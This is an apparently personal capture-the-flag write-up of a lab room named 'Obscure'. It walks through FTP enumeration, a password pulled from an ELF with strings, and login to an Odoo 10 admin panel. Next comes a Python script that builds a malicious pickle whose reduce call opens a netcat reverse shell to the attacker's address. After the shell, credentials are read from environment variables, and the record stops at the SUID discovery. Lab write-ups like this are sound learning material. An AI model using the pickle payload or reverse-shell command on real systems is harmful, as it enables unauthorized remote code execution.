# Obscure

### Obscure
Nmap scan shows ports 21,22 and 80 open.<br />
The ftp server contains the two following files:<br />
![image](https://github.com/user-attachments/assets/e5dad07a-78b6-48b7-87af-27f4ae8e6faf)<br />
So now I know that a possible domain name might be `antisoft.thm`. Let's see this ELF file how it works. <br />
![image](https://github.com/user-attachments/assets/41de072b-792d-44a5-a00d-b4f63d72b7b0)<br />
The good new is that an ID is hardcoded in the program, if I run the `strings` command:<br />
![image](https://github.com/user-attachments/assets/59f1133a-487b-4db1-a884-de973692c329)<br />
This gets me a password:<br />
![image](https://github.com/user-attachments/assets/41b4c27b-b884-42fa-88d9-810103422cc6)<br />
With this password I'm able to download a backup of the database of the website. To do that go to `http://10.10.188.107/web/database/manager`, click on `backup` and prompt the found password. I unzip the downloaded file and it contains some interesting stuff, for example a manifest:<br />
![image](https://github.com/user-attachments/assets/7230a5db-0d5a-4fcc-815f-742ae8f0e07d)<br />
Also, after a while I remembered I had found the domain `antisoft.thm`, so I try to log in with the password I found earlier and username `admin@antisoft.thm` and it worked!. Now that I'm in, since from the manifest I saw that the version of Odoo running is 10.0, I did some reaserch and found this [authenticated remote execution](https://www.exploit-db.com/exploits/44064) vulnerability.<br />
So I follow the steps written in the POC. First search for and install `Database Anonymization`:<br />
![image](https://github.com/user-attachments/assets/9280033c-f333-4a7c-9e44-abd01f8d623b)<br />
Now go on `settings` and click `Anonymize Database`:<br />
![image](https://github.com/user-attachments/assets/cd54e119-cf91-4b92-8e27-c763077c8b37)<br />
Click on `Anonymize Database` button. Now refresh the page again:<br />
![image](https://github.com/user-attachments/assets/ded3667e-7f04-4367-aee9-d72baa9217bd)<br />
On this window we want to first upload a malicious `.pickle` file and then click on `Reverse database Anonymization`. The pickle file I'm going to upload is this:

    import pickle
    import base64
    
    class Exploit(object):
        def __reduce__(self):
            return (eval, ("__import__('os').system('nc 10.11.127.156 9001 -e /bin/sh') or ['ok']",))
    
    # Serialize the object with pickle
    payload = pickle.dumps(Exploit(), protocol=2)
    
    # Optional: base64 encode (if needed for HTTP transport)
    encoded = base64.b64encode(payload)
    
    # Save to file
    with open("payload.pickle", "wb") as f:
        f.write(payload)
    
    print("[+] Payload written to payload.pickle")
Execute this python script and it will write a payload on a file called `payload.pickle`. So I upload the file and get the reverse shell! This gets me the first flag located at `/var/lib/odoo`. Once on the system, it welcomes me with a set of database credentials!<br />
![image](https://github.com/user-attachments/assets/ba506af2-e09a-4266-82f7-04a3576372a3)<br />
The presence of a file `.dockerenv` in `/` suggets me that I'm in a docker container. I need to escape. First I need to become root on the container. So I try to connect to the DB with `psql -h db -U odoo -d postgres` using this credentials, but they are wrong. But since the script suggests that these credentials are stored in environment variables, I run `env` to see them:<br />
![image](https://github.com/user-attachments/assets/f645c1b5-8a37-4622-bc14-85df7c846e76)<br />
Infact the password is different.<br />
At this point I was stuck for a while so I decided to run linpeas, and it finds a SUID binary actually inside `/`, the root directory, which I didn't notice initially. I think I need to exploit this to become root.<br />
![image](https://github.com/user-attachments/assets/2497a4b4-24db-442d-a670-77a354622cf5)<br />





